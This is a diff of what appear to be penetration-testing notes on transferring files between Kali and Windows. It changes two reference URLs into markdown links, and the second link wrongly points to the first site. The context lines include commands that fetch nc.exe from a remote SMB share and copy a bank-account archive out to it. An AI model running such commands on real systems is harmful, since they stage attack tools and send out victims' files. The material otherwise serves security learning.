@@ -79,5 +79,5 @@ copy \\10.11.0.105\ROPNOP\nc.exe .
 copy C:\bank-account.zip \\10.11.0.105\ROPNOP\
 ```
 **Reference**
-https://blog.ropnop.com/transferring-files-from-kali-to-windows/
-http://ostrokonskiy.tk/2017/01/23/windows-privilege-escalation/
+[https://blog.ropnop.com/transferring-files-from-kali-to-windows/](https://blog.ropnop.com/transferring-files-from-kali-to-windows/)
+[http://ostrokonskiy.tk/2017/01/23/windows-privilege-escalation/](https://blog.ropnop.com/transferring-files-from-kali-to-windows/)
